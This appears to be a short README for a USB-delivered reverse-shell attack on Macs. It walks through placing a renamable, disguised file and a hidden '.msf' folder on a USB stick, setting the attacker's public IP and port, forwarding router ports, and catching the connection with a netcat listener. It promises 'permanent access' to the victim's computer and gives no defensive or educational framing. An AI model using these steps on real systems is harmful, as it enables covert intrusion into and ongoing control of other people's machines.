1. Get a usb and name it "LMAO"
2. Put file "Click to spawn RS" and folder ".msf" inside the usb
3. cd into .msf and vim file "4444". Replace "IP" with your public IP address and "Port" with the port you would like to send on
4. To run, put USB in Mac and double click file "Click to spawn RS"
5. You also must setup port forwarding on your router, look up how to do this
6. Now to listen for the reverse shell, go into your mac terminal and type "nc -l -p PORT -vvv" (replace PORT with the port you sent it on)
7. You have permanent access to the remote computer, can control it via the command line 

NOTE: File "Click to spawn RS" can be renamed to whatever you like.
